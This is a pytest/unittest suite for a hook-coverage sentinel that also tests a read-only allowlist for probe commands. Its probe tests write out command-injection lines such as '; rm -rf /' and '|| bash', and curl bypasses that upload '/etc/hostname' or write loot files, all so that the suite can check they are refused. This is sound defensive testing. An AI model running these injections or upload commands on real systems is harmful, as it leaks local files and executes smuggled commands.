#!/usr/bin/env python3
"""Tests for the sentinel (sentinel/sentinel.py).

Zero network, zero dependency beyond pytest+stdlib. Every case builds a
throwaway harness in a tempdir -- its own settings file, its own hooks
directory, its own gate-stats journal -- and runs the sentinel as a
SUBPROCESS, exactly like a timer would. Nothing here reads the machine's real
configuration: --settings and --hook-dirs are always pointed at the tempdir,
so the suite cannot pass or fail because of what the host happens to wire.

The class that matters is TestCoverage: it pins the check the whole module
exists for -- a gate that is wired, present and syntactically perfect, and has
left NO trace in the journal.
"""
from __future__ import annotations

import importlib.util
import json
import os
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from datetime import datetime, timedelta
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent
SENTINEL = ROOT / "sentinel" / "sentinel.py"

VALID_HOOK = "#!/usr/bin/env python3\nimport sys\nsys.exit(0)\n"
BROKEN_HOOK = "#!/usr/bin/env python3\ndef broken(:\n    pass\n"


def sentinel_module():
    """sentinel/sentinel.py loaded by path, for the pure-function cases."""
    spec = importlib.util.spec_from_file_location("sentinel_mod", SENTINEL)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


class SentinelBase(unittest.TestCase):
    """One tempdir per test: hooks, settings, journal, report directory."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.hooks = self.root / "hooks"
        self.hooks.mkdir()
        self.state = self.root / "state"
        self.state.mkdir()
        self.stats = self.state / "gate-stats.jsonl"
        self.env = {"HARNESS_STATE_DIR": str(self.state),
                    "HARNESS_GATE_STATS": str(self.stats)}
        for var in ("HARNESS_SENTINEL_SETTINGS", "HARNESS_SENTINEL_EXEMPT",
                    "HARNESS_SENTINEL_PROBES", "HARNESS_SENTINEL_PROBE_ALLOW",
                    "HARNESS_SENTINEL_ACTIVITY_PATHS", "HARNESS_HOOK_DIRS",
                    "HARNESS_SENTINEL_COVERAGE_DAYS", "HARNESS_SENTINEL_REPORT_DIR",
                    "HARNESS_SENTINEL_FRESHNESS_HOURS"):
            os.environ.pop(var, None)

    def tearDown(self):
        self.tmp.cleanup()

    # --- fixture builders ---------------------------------------------------

    def hook_file(self, name, body=VALID_HOOK):
        path = self.hooks / name
        path.write_text(body, encoding="utf-8")
        return path

    def settings(self, commands, name="settings.json", event="PreToolUse"):
        """A minimal Claude Code settings file wiring the given commands."""
        data = {"hooks": {event: [{"matcher": "Bash", "hooks": [
            {"type": "command", "command": c} for c in commands]}]}}
        path = self.root / name
        path.write_text(json.dumps(data, indent=2), encoding="utf-8")
        return path

    def journal(self, entries):
        """entries: [(hook name, age in hours)]."""
        lines = []
        for name, age_h in entries:
            stamp = datetime.now() - timedelta(hours=age_h)
            lines.append(json.dumps({"ts": stamp.isoformat(timespec="seconds"),
                                     "hook": name, "result": "pass"}))
        self.stats.write_text("\n".join(lines) + "\n", encoding="utf-8")
        return self.stats

    def run_sentinel(self, args=(), env_extra=None, cwd=None):
        """cwd matters for one family of attacks: `curl --remote-name-all`
        writes into the CURRENT DIRECTORY, so a test that wants to prove no
        loot file appears has to control where a loot file would land."""
        env = dict(os.environ, **self.env, **(env_extra or {}))
        base = ["--hook-dirs", str(self.hooks)]
        return subprocess.run([sys.executable, str(SENTINEL)] + base + list(args),
                              capture_output=True, text=True, env=env, cwd=cwd,
                              timeout=120)

    # --- assertions ---------------------------------------------------------

    def verdict_of(self, out):
        line = [x for x in out.splitlines() if x.startswith("VERDICT")][-1]
        return line.split()[1]

    def lines_of(self, out, family):
        return [x for x in out.splitlines() if x.split()[1:2] == [family]]

    def last_stat(self):
        rows = self.stats.read_text(encoding="utf-8").strip().splitlines()
        return json.loads(rows[-1])


class TestNominal(SentinelBase):
    """Everything wired, present, and logging: the only path to a clean OK."""

    def test_t1_wired_present_and_logging_is_the_only_ok(self):
        self.hook_file("alpha-gate.py")
        cfg = self.settings(["python3 %s" % (self.hooks / "alpha-gate.py")])
        self.journal([("alpha", 1)])
        r = self.run_sentinel(["--settings", str(cfg)])
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(self.verdict_of(r.stdout), "OK", r.stdout)
        self.assertIn("1 hooks wired", r.stdout)
        self.assertIn("present, syntax OK", r.stdout)
        self.assertIn("trace(s) in the journal", r.stdout)
        report = self.state / "sentinel" / (datetime.now().strftime("%Y-%m-%d") + ".txt")
        self.assertTrue(report.exists(), "the daily report was not written")
        self.assertIn("VERDICT OK", report.read_text(encoding="utf-8"))

    def test_t2_the_sentinel_journals_its_own_run(self):
        """A sentinel that stops logging is exactly the failure it hunts."""
        self.hook_file("alpha-gate.py")
        cfg = self.settings(["python3 %s" % (self.hooks / "alpha-gate.py")])
        self.journal([("alpha", 1)])
        self.run_sentinel(["--settings", str(cfg)])
        stat = self.last_stat()
        self.assertEqual(stat["hook"], "sentinel")
        self.assertEqual(stat["result"], "observe")
        self.assertEqual(stat["verdict"], "OK")
        self.assertEqual(stat["hooks"], 1)

    def test_t3_enumerate_derives_the_inventory_and_checks_nothing(self):
        self.hook_file("alpha-gate.py")
        cfg = self.settings(["python3 %s" % (self.hooks / "alpha-gate.py"),
                             "bash -c 'echo inline'"])
        r = self.run_sentinel(["--settings", str(cfg), "--enumerate"])
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("alpha-gate.py", r.stdout)
        self.assertIn("inline", r.stdout)
        self.assertIn("total: 2 hooks wired across 1 settings file(s)", r.stdout)
        self.assertNotIn("VERDICT", r.stdout)
        self.assertFalse((self.state / "sentinel").exists())


class TestScripts(SentinelBase):
    """Presence and syntax of what the settings files actually point at."""

    def test_t4_wired_script_missing_from_disk_is_a_fail(self):
        cfg = self.settings(["python3 %s" % (self.hooks / "ghost-gate.py")])
        self.journal([("ghost", 1)])
        r = self.run_sentinel(["--settings", str(cfg)])
        self.assertEqual(self.verdict_of(r.stdout), "FAIL", r.stdout)
        self.assertIn("MISSING on disk", r.stdout)
        self.assertIn("ghost-gate.py", r.stdout)

    def test_t5_broken_python_is_caught_by_the_compile_check(self):
        self.hook_file("broken-gate.py", BROKEN_HOOK)
        cfg = self.settings(["python3 %s" % (self.hooks / "broken-gate.py")])
        self.journal([("broken", 1)])
        r = self.run_sentinel(["--settings", str(cfg)])
        self.assertEqual(self.verdict_of(r.stdout), "FAIL", r.stdout)
        syntax = [x for x in r.stdout.splitlines()
                  if x.startswith("FAIL script") and "syntax" in x]
        self.assertTrue(syntax, r.stdout)
        # the compile check writes NOTHING next to the inspected file
        self.assertFalse((self.hooks / "__pycache__").exists())

    def test_t6_unresolved_variable_is_reported_never_silently_skipped(self):
        cfg = self.settings(["python3 $NOT_SET_ANYWHERE/hooks/x-gate.py"])
        self.journal([("x", 1)])
        r = self.run_sentinel(["--settings", str(cfg)])
        self.assertIn("unresolved variable", r.stdout)
        self.assertIn("SKIP script", r.stdout)


class TestOrphans(SentinelBase):
    """A hook on disk that no settings file wires."""

    def test_t7_script_on_disk_wired_nowhere_warns(self):
        self.hook_file("alpha-gate.py")
        self.hook_file("forgotten-gate.py")
        cfg = self.settings(["python3 %s" % (self.hooks / "alpha-gate.py")])
        self.journal([("alpha", 1)])
        r = self.run_sentinel(["--settings", str(cfg)])
        self.assertEqual(self.verdict_of(r.stdout), "WARN", r.stdout)
        orphans = self.lines_of(r.stdout, "orphan")
        self.assertTrue(any("forgotten-gate.py" in x for x in orphans), orphans)
        self.assertFalse(any("alpha-gate.py" in x and x.startswith("WARN")
                             for x in orphans), orphans)

    def test_t8_exempt_list_silences_a_deliberate_unwired_tool(self):
        self.hook_file("alpha-gate.py")
        self.hook_file("by-hand.py")
        cfg = self.settings(["python3 %s" % (self.hooks / "alpha-gate.py")])
        self.journal([("alpha", 1)])
        r = self.run_sentinel(["--settings", str(cfg)],
                              {"HARNESS_SENTINEL_EXEMPT": "by-hand.py"})
        self.assertEqual(self.verdict_of(r.stdout), "OK", r.stdout)
        self.assertIn("SKIP orphan", r.stdout)
        self.assertIn("exempt", r.stdout)


class TestCoverage(SentinelBase):
    """The reason the module exists: wired is not alive, logging is."""

    def test_t9_wired_gate_with_no_journal_trace_is_flagged(self):
        self.hook_file("alpha-gate.py")
        self.hook_file("silent-gate.py")
        cfg = self.settings(["python3 %s" % (self.hooks / "alpha-gate.py"),
                             "python3 %s" % (self.hooks / "silent-gate.py")])
        self.journal([("alpha", 1)])
        r = self.run_sentinel(["--settings", str(cfg)])
        self.assertEqual(self.verdict_of(r.stdout), "WARN", r.stdout)
        coverage = self.lines_of(r.stdout, "coverage")
        dead = [x for x in coverage if "silent-gate.py" in x]
        self.assertTrue(dead, coverage)
        self.assertTrue(dead[0].startswith("WARN"), dead)
        self.assertIn("NO trace in the journal", dead[0])
        alive = [x for x in coverage if "alpha-gate.py" in x]
        self.assertTrue(alive[0].startswith("OK"), alive)

    def test_t10_a_trace_older_than_the_window_does_not_count(self):
        self.hook_file("alpha-gate.py")
        cfg = self.settings(["python3 %s" % (self.hooks / "alpha-gate.py")])
        self.journal([("alpha", 24 * 30)])       # last run a month ago
        r = self.run_sentinel(["--settings", str(cfg), "--coverage-days", "7"])
        dead = [x for x in self.lines_of(r.stdout, "coverage")
                if "alpha-gate.py" in x]
        self.assertTrue(dead[0].startswith("WARN"), dead)
        self.assertIn("over 7 days", dead[0])

    def test_t11_no_journal_means_undecidable_never_a_pass(self):
        """Absent noise is not zero noise: with no journal the sentinel
        REFUSES to declare any gate alive."""
        self.hook_file("alpha-gate.py")
        cfg = self.settings(["python3 %s" % (self.hooks / "alpha-gate.py")])
        r = self.run_sentinel(["--settings", str(cfg)])
        self.assertEqual(self.verdict_of(r.stdout), "FAIL", r.stdout)
        self.assertIn("nothing proves any gate is alive", r.stdout)
        coverage = self.lines_of(r.stdout, "coverage")
        self.assertEqual(len(coverage), 1, coverage)
        self.assertTrue(coverage[0].startswith("SKIP"), coverage)
        self.assertIn("UNDECIDABLE", coverage[0])


class TestJournal(SentinelBase):
    """The aliveness signal of the whole harness, checked on its own."""

    def test_t12_silent_journal_alone_is_a_warn_not_a_fail(self):
        self.hook_file("alpha-gate.py")
        cfg = self.settings(["python3 %s" % (self.hooks / "alpha-gate.py")])
        self.journal([("alpha", 80)])
        old = time.time() - 80 * 3600
        os.utime(self.stats, (old, old))
        r = self.run_sentinel(["--settings", str(cfg), "--coverage-days", "30"])
        journal = self.lines_of(r.stdout, "journal")
        self.assertTrue(journal[0].startswith("WARN"), journal)
        self.assertIn("either no session ran", journal[0])

    def test_t13_silent_journal_while_a_session_ran_is_a_fail(self):
        self.hook_file("alpha-gate.py")
        cfg = self.settings(["python3 %s" % (self.hooks / "alpha-gate.py")])
        self.journal([("alpha", 80)])
        old = time.time() - 80 * 3600
        os.utime(self.stats, (old, old))
        activity = self.root / "activity"
        activity.mkdir()
        (activity / "session.jsonl").write_text("{}\n", encoding="utf-8")
        r = self.run_sentinel(["--settings", str(cfg), "--coverage-days", "30"],
                              {"HARNESS_SENTINEL_ACTIVITY_PATHS": str(activity)})
        journal = self.lines_of(r.stdout, "journal")
        self.assertTrue(journal[0].startswith("FAIL"), journal)
        self.assertIn("the wired gates are mute", journal[0])

    def test_t14_corrupt_tail_line_is_a_fail(self):
        self.hook_file("alpha-gate.py")
        cfg = self.settings(["python3 %s" % (self.hooks / "alpha-gate.py")])
        self.journal([("alpha", 1)])
        with open(self.stats, "a", encoding="utf-8") as f:
            f.write("this line is not json\n")
        r = self.run_sentinel(["--settings", str(cfg)])
        self.assertEqual(self.verdict_of(r.stdout), "FAIL", r.stdout)
        self.assertIn("last line is not JSON", r.stdout)


class TestRobustness(SentinelBase):
    """A health check that crashes is a health check that lies."""

    def test_t15_unreadable_settings_file_is_reported_and_never_raises(self):
        bad = self.root / "settings.json"
        bad.write_text("{ this is not json", encoding="utf-8")
        self.journal([("alpha", 1)])
        r = self.run_sentinel(["--settings", str(bad)])
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(self.verdict_of(r.stdout), "FAIL", r.stdout)
        self.assertIn("unreadable JSON", r.stdout)

    def test_t16_missing_settings_file_is_a_fail_not_an_empty_audit(self):
        r = self.run_sentinel(["--settings", str(self.root / "nowhere.json")])
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("file not found", r.stdout)

    def test_t17_strict_turns_a_fail_verdict_into_exit_1(self):
        cfg = self.settings(["python3 %s" % (self.hooks / "ghost-gate.py")])
        self.journal([("ghost", 1)])
        plain = self.run_sentinel(["--settings", str(cfg)])
        self.assertEqual(plain.returncode, 0, plain.stderr)
        strict = self.run_sentinel(["--settings", str(cfg), "--strict"])
        self.assertEqual(strict.returncode, 1, strict.stdout)

    def test_t18_probe_outside_the_allowlist_is_skipped_with_its_reason(self):
        self.hook_file("alpha-gate.py")
        cfg = self.settings(["python3 %s" % (self.hooks / "alpha-gate.py")])
        self.journal([("alpha", 1)])
        probes = self.root / "probes.txt"
        probes.write_text("# a comment\ntest -d %s\nnot-allowed --wipe\n" % self.root,
                          encoding="utf-8")
        r = self.run_sentinel(["--settings", str(cfg), "--probes", str(probes)])
        probe_lines = self.lines_of(r.stdout, "probe")
        self.assertTrue(any(x.startswith("OK") and "test -d" in x
                            for x in probe_lines), probe_lines)
        skipped = [x for x in probe_lines if x.startswith("SKIP")]
        self.assertTrue(skipped, probe_lines)
        self.assertIn("not in the allowlist", skipped[0])


class TestProbeExecution(SentinelBase):
    """The probe file is CONFIG, read by a job that runs unattended from a
    timer. Allowlisting the first word of a line that is then handed whole to a
    shell protects nothing, and one malformed line must cost one line."""

    def probe_run(self, probe_lines, args=()):
        self.hook_file("alpha-gate.py")
        cfg = self.settings(["python3 %s" % (self.hooks / "alpha-gate.py")])
        self.journal([("alpha", 1)])
        probes = self.root / "probes.txt"
        probes.write_text("".join(line + "\n" for line in probe_lines),
                          encoding="utf-8")
        return self.run_sentinel(["--settings", str(cfg), "--probes", str(probes)]
                                 + list(args))

    def skips(self, out):
        return [x for x in self.lines_of(out, "probe") if x.startswith("SKIP")]

    def test_t21_an_allowlisted_head_never_smuggles_a_second_command(self):
        """The measured bypass: `test` passed the allowlist, then the WHOLE
        line ran under `bash -c` and the half after the `;` executed."""
        loot = self.root / "PWNED"
        for line in ("test -d /tmp; echo PWNED > %s" % loot,
                     "test -d /tmp && echo PWNED > %s" % loot,
                     "test -d /tmp | tee %s" % loot,
                     "test -d $(echo /tmp)",
                     "test -d `echo /tmp`"):
            r = self.probe_run([line])
            self.assertFalse(loot.exists(),
                             "the smuggled command RAN for %r:\n%s" % (line, r.stdout))
            skipped = self.skips(r.stdout)
            self.assertTrue(skipped, "%r was not skipped:\n%s" % (line, r.stdout))
            self.assertIn("metacharacter", skipped[0])
        # SKIP never moves the verdict, and the legitimate line still runs.
        r = self.probe_run(["test -d /tmp; echo PWNED > %s" % loot, "test -d /tmp"])
        self.assertEqual(self.verdict_of(r.stdout), "OK", r.stdout)
        self.assertTrue(any(x.startswith("OK") and "test -d /tmp" in x
                            for x in self.lines_of(r.stdout, "probe")), r.stdout)

    def test_t22_the_allowlist_is_a_binary_not_a_word_and_carries_its_rules(self):
        """A planted binary that merely SHARES the name does not pass, and an
        allowlisted binary is still confined to read-only use."""
        planted = self.hooks / "test"
        planted.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
        planted.chmod(0o755)
        loot = self.root / "LOOT"
        r = self.probe_run(["%s -d /tmp" % planted,
                            "systemctl --user stop example-service.service",
                            "curl -fsS --max-time 2 -o %s http://127.0.0.1:1/x" % loot,
                            "curl -fsS --max-time 2 -T /etc/hostname http://127.0.0.1:1/x"])
        reasons = " | ".join(self.skips(r.stdout))
        self.assertIn("non-canonical path", reasons)
        self.assertIn("systemctl: verb is not read-only", reasons)
        self.assertIn("-o pointing somewhere other than /dev/null", reasons)
        self.assertIn("option outside the allowlist: -T", reasons)
        self.assertFalse(loot.exists(), r.stdout)
        self.assertEqual(len(self.skips(r.stdout)), 4, r.stdout)

    def test_t23_one_malformed_probe_line_does_not_kill_the_whole_report(self):
        """The parse used to sit outside the loop's try: an unclosed quote
        raised to the module's fail-open handler, so NO dated report was
        written and not one other family ran."""
        r = self.probe_run(['test -f "/etc/hostname', "test -d /tmp"])
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertNotIn("unexpected error", r.stderr)
        report = self.state / "sentinel" / (datetime.now().strftime("%Y-%m-%d") + ".txt")
        self.assertTrue(report.exists(),
                        "no dated report was written:\n%s\n%s" % (r.stdout, r.stderr))
        self.assertIn("VERDICT", report.read_text(encoding="utf-8"))
        skipped = self.skips(r.stdout)
        self.assertTrue(skipped, r.stdout)
        self.assertIn("unparsable line", skipped[0])
        # the malformed line costs itself, and NOTHING else
        self.assertTrue(any(x.startswith("OK") and "test -d /tmp" in x
                            for x in self.lines_of(r.stdout, "probe")), r.stdout)
        for family in ("settings", "script", "journal", "coverage"):
            self.assertTrue(self.lines_of(r.stdout, family),
                            "family %s never ran:\n%s" % (family, r.stdout))
        self.assertEqual(self.last_stat()["result"], "observe", self.last_stat())

    def test_t24_the_probe_parser_is_the_same_gate_as_recalls_check_field(self):
        """Pure functions, and the SAME OBJECT as the one recall's `check:`
        field uses -- not "the same by construction", which is what two copies
        of it claimed while one still accepted `-o/tmp/loot` and the other did
        not. Both import hooks/_exec_guard.py, so `is` holds here and a fix
        can no longer land on one side only."""
        mod = sentinel_module()
        spec = importlib.util.spec_from_file_location(
            "recall_for_parity", str(ROOT / "recall" / "recall.py"))
        recall_mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(recall_mod)
        self.assertIs(mod.binary_refusal, recall_mod.binary_refusal)
        self.assertIs(mod.SHELL_META_RE, recall_mod.SHELL_META_RE)
        # A guard that cannot be imported CLOSES the probe family instead of
        # opening it: fail-open protects the operator's work from a broken
        # gate, and there is no work of his to protect in a config file that
        # executes itself.
        saved, mod.EXEC_GUARD_ERROR = mod.EXEC_GUARD_ERROR, "ImportError: boom"
        try:
            self.assertIn("exec guard unavailable", mod.probe_argv(
                "test -d /tmp", set(mod.DEFAULT_PROBE_ALLOW))[1])
        finally:
            mod.EXEC_GUARD_ERROR = saved
        allow = set(mod.DEFAULT_PROBE_ALLOW)
        argv, refusal = mod.probe_argv("test -d /tmp", allow)
        self.assertEqual((argv, refusal), (["test", "-d", "/tmp"], None))
        for bad in ("test -d /tmp; rm -rf /", "test -d /tmp > /x", "test -d ~",
                    "test -d /tmp || bash"):
            self.assertIn("metacharacter", mod.probe_argv(bad, allow)[1], bad)
        self.assertIn("unparsable line", mod.probe_argv('test -f "/x', allow)[1])
        self.assertIn("not in the allowlist", mod.probe_argv("bash -c x", allow)[1])
        self.assertIn("nothing left after parsing", mod.probe_argv("   ", allow)[1])
        self.assertIsNone(mod.probe_argv(
            "curl -fsS --max-time 5 -o /dev/null http://127.0.0.1:8080/health",
            allow)[1])
        self.assertIsNone(mod.probe_argv(
            "systemctl --user is-active --quiet example.service", allow)[1])


class TestProbeCurlAllowlist(SentinelBase):
    """One case per bypass MEASURED against the previous BLOCKLIST, curl 8.5.0.

    The blocklist named -O, -T, -d, -F and --config, and the docs promised
    "curl may neither upload nor write to disk". Every line below was reported
    OK, not SKIP, and every one of them left loot: a file on disk, or the bytes
    of a local file in the remote server's log. A blocklist over a CLI with
    hundreds of options can only ever be a list of the tricks somebody already
    thought of.

    What a fix has to prove is NOT that the line is refused -- it is that the
    loot is ABSENT. So every case here runs the attack and a legitimate probe
    in the SAME probe file, and asserts three things at once: the attack is
    SKIPped, no file appears where its loot would land, and the local server
    received EXACTLY the one harmless GET of the legitimate line. That last
    assertion is what makes the silence meaningful: an empty server log proves
    nothing if the server was never listening (absent noise is not zero noise).
    """

    def setUp(self):
        super().setUp()
        self.loot = self.root / "loot"
        self.loot.mkdir()
        self.received = []
        self.url = "http://127.0.0.1:%d/probe" % self.start_sink()
        self.legit = "curl -fsS --max-time 5 -o /dev/null %s" % self.url

    def start_sink(self):
        """A loopback HTTP server that records every request it receives.
        Answers with an ETag and a Set-Cookie so the --etag-save and
        --cookie-jar attacks have something real to write down."""
        received = self.received

        class Sink(BaseHTTPRequestHandler):
            def record(self, verb):
                size = int(self.headers.get("Content-Length") or 0)
                received.append((verb, self.rfile.read(size) if size else b""))
                body = b"sink-ok\n"
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.send_header("ETag", '"sink-etag-1"')
                self.send_header("Set-Cookie", "sinkjar=1; Path=/")
                self.end_headers()
                self.wfile.write(body)

            def do_GET(self):
                self.record("GET")

            def do_POST(self):
                self.record("POST")

            def do_HEAD(self):
                self.record("HEAD")

            def log_message(self, *a):
                pass

        srv = HTTPServer(("127.0.0.1", 0), Sink)
        self.addCleanup(srv.server_close)
        self.addCleanup(srv.shutdown)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        return srv.server_address[1]

    def probe_run(self, probe_lines):
        """The sentinel runs from self.loot: `curl --remote-name-all` writes
        into the current directory, so the current directory has to be the
        place the test watches."""
        self.hook_file("alpha-gate.py")
        cfg = self.settings(["python3 %s" % (self.hooks / "alpha-gate.py")])
        self.journal([("alpha", 1)])
        probes = self.root / "probes.txt"
        probes.write_text("".join(line + "\n" for line in probe_lines),
                          encoding="utf-8")
        return self.run_sentinel(["--settings", str(cfg), "--probes", str(probes)],
                                 cwd=str(self.loot))

    def refuse(self, attack, hint):
        """The attack is SKIPped, it wrote NOTHING, it sent NOTHING, and the
        legitimate probe next to it still ran."""
        self.received.clear()
        r = self.probe_run([attack, self.legit])
        probe_lines = self.lines_of(r.stdout, "probe")
        skipped = [x for x in probe_lines if x.startswith("SKIP")]
        passed = [x for x in probe_lines if x.startswith("OK")]
        self.assertEqual(len(skipped), 1,
                         "%r was not refused:\n%s" % (attack, r.stdout))
        self.assertIn(hint, skipped[0])
        self.assertEqual(len(passed), 1,
                         "the legitimate probe stopped running:\n%s" % r.stdout)
        self.assertEqual(sorted(os.listdir(self.loot)), [],
                         "loot was written for %r:\n%s" % (attack, r.stdout))
        self.assertEqual(self.received, [("GET", b"")],
                         "the server saw more than the legitimate GET for %r: %r"
                         % (attack, self.received))
        # a refused probe is a SKIP, and a SKIP never moves the verdict
        self.assertEqual(self.verdict_of(r.stdout), "OK", r.stdout)
        return skipped[0]

    # --- the bypasses, in the order they were measured ----------------------

    def test_t25_output_glued_to_the_flag(self):
        """-o/tmp/loot.txt: the token never equals "-o", so a blocklist that
        compares tokens never sees it."""
        self.refuse("curl -fsS --max-time 3 -o%s/A1.txt %s" % (self.loot, self.url),
                    "-o takes a value and may be neither glued nor combined")

    def test_t26_output_joined_with_an_equals_sign(self):
        self.refuse("curl -fsS --max-time 3 --output=%s/A2.txt %s"
                    % (self.loot, self.url),
                    "the value of --output must be a separate argument")

    def test_t27_output_letter_buried_in_a_short_cluster(self):
        """-fsSo: three harmless letters and a write, in one token."""
        self.refuse("curl -fsSo %s/A3.txt --max-time 3 %s" % (self.loot, self.url),
                    "-o takes a value and may be neither glued nor combined")

    def test_t28_data_ascii_uploads_a_local_file(self):
        """The one that is not a disk write at all: the CONTENT of a local
        file, POSTed to the remote host. The old rule watched -d and --data
        and never looked at --data-ascii."""
        self.refuse("curl -sS --max-time 3 -o /dev/null --data-ascii @/etc/hostname %s"
                    % self.url, "option outside the allowlist: --data-ascii")

    def test_t29_json_uploads_a_local_file(self):
        self.refuse("curl -sS --max-time 3 -o /dev/null --json @/etc/hostname %s"
                    % self.url, "option outside the allowlist: --json")

    def test_t30_header_dump_writes_a_file(self):
        for option in ("-D", "--dump-header"):
            with self.subTest(option=option):
                self.refuse("curl -sS --max-time 3 -o /dev/null %s %s/A6.txt %s"
                            % (option, self.loot, self.url),
                            "option outside the allowlist: %s" % option)

    def test_t31_trace_ascii_writes_a_file(self):
        self.refuse("curl -sS --max-time 3 -o /dev/null --trace-ascii %s/A8.txt %s"
                    % (self.loot, self.url),
                    "option outside the allowlist: --trace-ascii")

    def test_t32_stderr_redirection_writes_a_file(self):
        self.refuse("curl -sS --max-time 3 -o /dev/null --stderr %s/A9.txt %s"
                    % (self.loot, self.url),
                    "option outside the allowlist: --stderr")

    def test_t33_cookie_jar_writes_a_file(self):
        for option in ("-c", "--cookie-jar"):
            with self.subTest(option=option):
                self.refuse("curl -sS --max-time 3 -o /dev/null %s %s/A10.txt %s"
                            % (option, self.loot, self.url),
                            "option outside the allowlist: %s" % option)

    def test_t34_etag_save_writes_a_file(self):
        self.refuse("curl -sS --max-time 3 -o /dev/null --etag-save %s/A12.txt %s"
                    % (self.loot, self.url),
                    "option outside the allowlist: --etag-save")

    def test_t35_remote_name_all_writes_into_the_current_directory(self):
        """No path in the line at all: curl takes the file name from the URL
        and writes it wherever the sentinel happens to be running."""
        self.refuse("curl -sS --max-time 3 --remote-name-all %s/A13.txt" % self.url,
                    "option outside the allowlist: --remote-name-all")

    def test_t36_form_string_uploads(self):
        self.refuse("curl -sS --max-time 3 -o /dev/null --form-string secret=leak %s"
                    % self.url, "option outside the allowlist: --form-string")

    def test_t37_write_out_may_not_write_a_file_through_its_format(self):
        """-w is allowlisted, and curl >= 8.3 writes to a file from the FORMAT
        STRING itself (%output{...}). The braces make the metacharacter rule
        fire first; the curl rule is checked on its own so the guarantee does
        not rest on that accident."""
        self.refuse("curl -sS --max-time 3 -o /dev/null -w %%output{%s/W.txt}x %s"
                    % (self.loot, self.url), "metacharacter")
        mod = sentinel_module()
        allow = set(mod.DEFAULT_PROBE_ALLOW)
        refusal = mod.probe_refusal(
            ["curl", "-o", "/dev/null", "-w", "%%output{%s/W.txt}x" % self.loot,
             self.url], allow)
        self.assertIn("format string", refusal or "")
        self.assertIn("reading its format from a file", mod.probe_refusal(
            ["curl", "-o", "/dev/null", "-w", "@/etc/hostname", self.url], allow))

    def test_t38_a_url_that_is_not_http_reads_the_local_disk(self):
        """file:///etc/hostname is not a network probe, it is a file read."""
        self.refuse("curl -sS --max-time 3 -o /dev/null file:///etc/hostname",
                    "URL scheme is not http or https")

    # --- the control: an allowlist that refuses everything protects nothing --

    def test_t39_a_legitimate_health_probe_still_runs(self):
        """The load-bearing counterweight. A gate that refuses every line is
        not a safe gate, it is a dead feature."""
        r = self.probe_run([self.legit,
                            "curl -s -o /dev/null --connect-timeout 2 %s" % self.url,
                            "curl -sSI --max-time 5 -o /dev/null %s" % self.url,
                            "systemctl --user is-active --quiet example.service",
                            "test -d %s" % self.root])
        probe_lines = self.lines_of(r.stdout, "probe")
        self.assertFalse([x for x in probe_lines if x.startswith("SKIP")],
                         "a legitimate probe was refused:\n%s" % r.stdout)
        curl_lines = [x for x in probe_lines if " curl " in x]
        self.assertEqual(len(curl_lines), 3, r.stdout)
        for line in curl_lines:
            self.assertTrue(line.startswith("OK"), line)
        self.assertEqual([verb for verb, _body in self.received],
                         ["GET", "GET", "HEAD"], self.received)
        self.assertEqual(sorted(os.listdir(self.loot)), [], r.stdout)

    def test_t40_the_allowlist_is_a_pure_function_and_says_why(self):
        """Every refusal carries its reason, and the same rules hold for the
        two other allowlisted binaries."""
        mod = sentinel_module()
        allow = set(mod.DEFAULT_PROBE_ALLOW)
        for allowed in ("curl -fsS --max-time 5 -o /dev/null https://example.com",
                        "curl -s -o /dev/null --connect-timeout 2 http://a.example/h",
                        "curl -sSI -m 5 -o /dev/null https://example.com/health",
                        "systemctl --user is-active --quiet example.service",
                        "systemctl --no-pager status example.service",
                        "test -d /var/log"):
            self.assertIsNone(mod.probe_argv(allowed, allow)[1], allowed)
        for refused in (
                "curl -sS -o /dev/null -H X-Loot:secret https://example.com",
                "curl -sS -o /dev/null -u admin:hunter2 https://example.com",
                "curl -sS -o /dev/null --upload-file /etc/hostname https://e.example",
                "curl -sS -m /etc/hostname -o /dev/null https://example.com",
                "curl -sSm3 -o /dev/null https://example.com",
                "curl -sS -o /dev/null https://a.example https://b.example",
                "curl -sS -o /dev/null",
                "curl -sS -o /dev/null example.com",
                "curl -sS -o /dev/null scp://host/etc/passwd",
                "systemctl --user stop example.service",
                "systemctl --signal status kill example.service",
                "systemctl is-active --root /mnt example.service",
                "test -d /tmp /etc",
                "test -z /tmp",
                "test -d etc"):
            refusal = mod.probe_argv(refused, allow)[1]
            self.assertTrue(refusal, "NOT refused: %s" % refused)


class TestMatching(unittest.TestCase):
    """Pure functions: how a script name is matched against a journaled one."""

    def test_t19_journal_key_normalizes_stem_and_gate_suffix(self):
        mod = sentinel_module()
        self.assertEqual(mod.journal_key("home-prefix-gate.py"), "home-prefix")
        self.assertEqual(mod.journal_key("/a/b/scope_write_gate.py"), "scope-write")
        self.assertEqual(mod.journal_key("home-prefix"), "home-prefix")
        self.assertTrue(mod.keys_match(mod.journal_key("home-prefix-gate.py"),
                                       mod.journal_key("home-prefix")))
        self.assertFalse(mod.keys_match(mod.journal_key("alpha-gate.py"),
                                        mod.journal_key("beta-gate.py")))

    def test_t20_script_of_ignores_interpreters_and_data_arguments(self):
        mod = sentinel_module()
        self.assertEqual(mod.script_of("/opt/venv/bin/python3 /srv/hooks/a-gate.py"),
                         ("/srv/hooks/a-gate.py", "script"))
        self.assertEqual(mod.script_of("bash -c 'echo hi'"), (None, "inline"))
        self.assertEqual(mod.script_of("python3 $UNSET_VAR/hooks/a-gate.py"),
                         (None, "unresolved"))


if __name__ == "__main__":
    unittest.main(verbosity=2)
